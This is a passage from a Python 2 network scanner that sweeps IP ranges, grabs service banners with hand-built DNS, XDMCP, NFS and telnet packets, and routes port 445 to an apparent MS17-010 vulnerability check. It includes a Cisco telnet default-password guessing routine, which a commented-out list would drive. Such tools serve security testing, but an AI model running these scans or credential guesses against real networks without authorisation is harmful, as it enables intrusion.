                    #rbuf = rbuf.replace('\x00', 'ssssss')
                    return rbuf
            return "Nothing"
    def do_nfs_check_port(self,sock):
        trigger="\xbb\x05\xa8\x9d\x00\x00\x00\x00"+\
        "\x00\x00\x00\x02\x00\x01\x86\xa0"+\
        "\x00\x00\x00\x02\x00\x00\x00\x03"+\
        "\x00\x00\x00\x00\x00\x00\x00\x00"+\
        "\x00\x00\x00\x00\x00\x00\x00\x00"+\
        "\x00\x01\x86\xa5\x00\x00\x00\x01"+\
        "\x00\x00\x00\x11\x00\x00\x00\x00"
        rsend="\xbe\xeb\xfe\x32\x00\x00\x00\x00"+\
        "\x00\x00\x00\x02\x00\x01\x86\xa5"+\
        "\x00\x00\x00\x01\x00\x00\x00\x05"+\
        "\x00\x00\x00\x00\x00\x00\x00\x00"+\
        "\x00\x00\x00\x00\x00\x00\x00\x00"
        sock.send(trigger)
        rbuf = sock.recv(256)
        if(len(rbuf) == 28):
            portnum = (ord(rbuf[24]) << 24) + (ord(rbuf[25]) << 16) + (ord(rbuf[26]) << 8) + ord(rbuf[27])
            sock = TimeoutSocket(socket(AF_INET, sk.SOCK_DGRAM, sk.IPPROTO_UDP), _DefaultTimeout)
            sock.bind((srcip,0))
            sock.set_timeout(TIME_OUT)
            sock.connect((self.host, portnum))
            sock.send(rsend)
            rbuf = sock.recv(2048)
            print rbuf
    def snmp_check(self):
        sock = TimeoutSocket(socket(AF_INET, sk.SOCK_DGRAM, sk.IPPROTO_UDP), _DefaultTimeout)
        sock.set_timeout(TIME_OUT)
        sock.connect((self.host, self.port))
        #1.3.6.1.4.1.77.1.2.25
    def do_dns_ck(self, sock):
        rbuf = ""
        trigger = "\x7b\x3b" + \
            "\x01\x00" + \
            "\x00\x01" + \
            "\x00\x00\x00\x00\x00\x00" + \
            "\x07\x76\x65\x72\x73\x69\x6f" + \
            "\x6e\x04\x62\x69\x6e\x64\x00" + \
            "\x00\x10\x00\x03"
        sock.send(trigger)
        rbuf = sock.recv(256)
        if(len(rbuf) > 40):
            try:
                if(rbuf[0] != '\x7b' and rbuf[1] != '\x3b'):
                    return "unknown"
                if((ord(rbuf[30]) & 0xff) == 192):
                    return "BIND:" + rbuf[43:].split("\xc0")[0]
                else:
                    return "BIND:" + rbuf[55:].split("\xc0")[0]
            except:pass
        rbuf = "unknown"
        return rbuf
        
    def do_xdmcp_ck(self, sock):
    #udp scan
        rbuf = ""
        trigger = "\x00\x01\x00\x02\x00\x01\x00"
        sock.send(trigger)
        rbuf = sock.recv(256)
        if(len(rbuf) > 10):
            try:
                if(rbuf[0] == '\x00' and rbuf[1] == '\x01' and rbuf[2] == '\x00' and rbuf[3] == '\x05'):
                    ret = rbuf[10:].split("\x00")
                    return "Hostname(%s) Info(%s)" % (ret[0], ret[1][1:])
            except:pass
        rbuf = "unknown"
        return rbuf
    def do_telnet_ck(self, sock):
        rbuf = ""
        ret = ""
        #passlist=['cisco','admin','support']
        #for x in passlist:
            #self.__cisco_check(x)
        rbuf = sock.recv(14)
        if(len(rbuf)):
            try:
               for x in rbuf:
                    ret += str(ord(x))
            except:pass
            return ret
        return "unknown"
    def __cisco_check(self, password):
        rbuf = "%s\r\n" % password
        result = ""
        try:
            sock = socket(AF_INET, SOCK_STREAM)
            sock.set_timeout(TIME_OUT)
            sock.connect((self.host, self.port))
            result = sock.recv(1024)
            if(len(result) > 5):
                sock.send(rbuf)
                sock.recv(1024)
                result = sock.recv(1024)
                if 'assw' not in result:
                    print('%-15s:%d  [CISCO]\t[PASS] %s') % (self.host, self.port, password)
                    sock.close()
        except:pass
        sock.close()

    def run(self):
        try:
            # connect to the given host:port
            banner = ""
            if (resolv == 1):
                #sk.socket.set_timeout(TIME_OUT)
                hostname = sk.gethostbyaddr(self.host)
                if(len(hostname[0]) > 1):
                    print("%s\t%s") % (hostname[0], hostname[2]) 
            if((self.port == 80) or (self.port == 443) or (self.port == 8080) or (self.port == 3128)):
                self.sd.connect((self.host, self.port))
                banner = self.do_www_ck(self.sd)
            elif((self.port == 22) or (self.port == 21)):
                self.sd.connect((self.host, self.port))
                banner = self.do_sshd_ck(self.sd)
            elif(self.port == 23):
                self.sd.connect((self.host, self.port))
                banner = self.do_telnet_ck(self.sd)
            elif(self.port == 25) or (self.port == 110) or (self.port == 143):
                self.sd.connect((self.host, self.port))
                banner = self.do_sshd_ck(self.sd)
            elif(self.port == 1521):
                self.sd.connect((self.host, self.port))
                banner = self.do_oracle_ck(self.sd)
            elif(self.port == 3306):
                self.sd.connect((self.host, self.port))
                banner = self.do_mysql_ck(self.sd)
            elif(self.port == 1433):
                self.sd.connect((self.host, self.port))
                banner = self.do_mssql_ck(self.sd)
            elif(self.port == 1723):
                self.sd.connect((self.host, self.port))
                banner = self.do_pptpd_ck(self.sd)
            elif(self.port == 1755):
                self.sd.connect((self.host, self.port))
                banner = self.do_wms_ck(self.sd)
            elif(self.port == 139):
                self.sd.connect((self.host, self.port))
                banner = self.do_smb_ck(self.sd)
            elif(self.port == 445):
                self.sd.connect((self.host, self.port))
                banner = self.smb_17010_XOR(self.sd)
            elif(self.port == 5900):
                self.sd.connect((self.host, self.port))
                banner = self.do_realvnc_ck(self.sd)
            elif(self.port == 6112):
                self.sd.connect((self.host, self.port))
                banner = self.do_dtspcd_ck(self.sd)
            elif(self.port == 53): #udp
                self.sd = TimeoutSocket(socket(AF_INET, sk.SOCK_DGRAM, sk.IPPROTO_UDP), _DefaultTimeout)
                self.sd.bind((srcip,0))
                self.sd.set_timeout(TIME_OUT)
                self.sd.connect((self.host, self.port))
                banner = self.do_dns_ck(self.sd)
            elif(self.port == 161): #udp
                self.sd = TimeoutSocket(socket(AF_INET, sk.SOCK_DGRAM, sk.IPPROTO_UDP), _DefaultTimeout)
                self.sd.bind((srcip,0))
                self.sd.set_timeout(TIME_OUT)
                self.sd.connect((self.host, self.port))
                banner = self.do_snmp_ck(self.sd)
            elif(self.port == 177): #udp
                self.sd = TimeoutSocket(socket(AF_INET, sk.SOCK_DGRAM, sk.IPPROTO_UDP), _DefaultTimeout)
                self.sd.bind((srcip,0))
                self.sd.set_timeout(TIME_OUT)
                self.sd.connect((self.host, self.port))
                banner = self.do_xdmcp_ck(self.sd)
            elif(self.port == 111):#udp
                self.sd = TimeoutSocket(socket(AF_INET, sk.SOCK_DGRAM, sk.IPPROTO_UDP), _DefaultTimeout)
                self.sd.bind((srcip,0))
                self.sd.set_timeout(TIME_OUT)
                self.sd.connect((self.host, self.port))
                #self.do_nfs_check_port(self.sd)
                banner = self.do_sad_ck(self.sd)
            elif(stype==1): #HTTP
                self.sd.connect((self.host, self.port))
                banner=self.do_www_ck(self.sd)
            elif(stype==2): #Normal TCP CONNECT
                self.sd.connect((self.host, self.port))
                banner=self.do_sshd_ck(self.sd)
            elif(stype==3): #Oracle sid
                self.sd.connect((self.host, self.port))
                banner=self.do_oracle_ck(self.sd)
            elif(stype==4): #Mysql
                self.sd.connect((self.host, self.port))
                banner=self.do_mysql_ck(self.sd)
            elif(stype==5): #MSSQL
                self.sd.connect((self.host, self.port))
                banner=self.do_mssql_ck(self.sd)
            elif(stype==6): #VNC
                self.sd.connect((self.host, self.port))
                banner=self.do_realvnc_ck(self.sd)
            elif(stype==0):
                self.sd.connect((self.host, self.port))
                banner = "no banner"
            print "%-15s:%d  OPEN\t%s" % (self.host, self.port, banner)
            self.sd.close()
        except: pass
def printscantype(indexs):
        types = ['TCP CONNECT(No Banner)','HTTP','TCP GRAP Banner','Oracle','Mysql','MSSQL','REALVNC']
        try:
            return types[int(indexs)]
        except:
            print "scantype para error"

class pyScan:
    def __init__(self, sargs=[]):
        # arguments vector
        #self.args = sargs
        self.port = 80
        try:
            (opts, args) = getopt.getopt(sargs[1:], "s:e:p:d:t:l:n:T:v:",["hostname=","url=","sourceip=","snmpstring="])
        except getopt.GetoptError:
            usage()
            return
        i = 0
        flag = 0
        global MAX_THREADS
        global TIME_OUT
        global resolv
        global snmpstring
        global srcip
        global stype
        global vul
        global httphost
        global requesturl
        requesturl = "/robots.txt"
        vul = 1
        httphost = "NULL"
        snmpstring = "\x70\x75\x62\x6c\x69\x63"
        #snmpstring = "\x66\x75\x63\x6b\x77\x68\x6f"
        resolv = 0
        srcip="0.0.0.0"
        stype = 0
        for o, a in opts:
    #    print o,a
            if o in ["-s"]:
                self.start = dqtoi(a)
                i += 1
            if o in ["-e"]:
                self.stop = dqtoi(a)
                i += 1
            if o in ["-p"]:
                self.port = a
                i += 1
            if o in ["-l"]:
                flag = 1
                i += 1
            if o in ["-d"]:             
                MAX_THREADS = int(a)
                i += 1
                print "Max thread:", MAX_THREADS
            if o in ["-t"]:
                TIME_OUT = float(a)
                i += 1
                print "Set timeout:", TIME_OUT
            if o in ["-n"]:
                print "Resolv Hostname"
                resolv = 1
                i += 1
            if o in ["--snmpstring"]:
                print "Set SNMP String :" + a
                snmpstring = a
                #print snmpstring
                i +=1
            if o in ["--sourceip"]:
                print "Set Source IP :" + a
                srcip = a
                i +=1
            if o in ["-T"]:
                print "ScanType Is :" + printscantype(a)
                stype = int(a)
                i +=1
            if o in ["-v"]:
                print "Dont check vul :" + a
                vul = int(a)
                i +=1
            if o in ["--hostname"]:
                print "HTTP HOSTNAME :" + a
                httphost = a
                i +=1
            if o in ["--url"]:
                print "Rereqeust URL :" + a
                requesturl = a
                i +=1
        if i < 1:
            #print "No enough parameters"
            usage()
            return
        if flag == 1:
            for self.port in 21, 22, 25, 53, 80, 111, 110, 143, 139, 443, 445, 161, 177, 1723, 1755, 1433, 1521, 3306, 5900, 6112, 8080:
                self.scan(self.port, self.start, self.stop)
        else:
            self.scan(self.port, self.start, self.stop)

    def scan(self, port, start, stop):
        self.host = start
        while self.host <= stop:
            while self.host <= stop and threading.activeCount() < MAX_THREADS:
                Scanner(itodq(self.host), int(port)).start()
                self.host += 1
        

if __name__ == "__main__":
    pyScan(sys.argv)
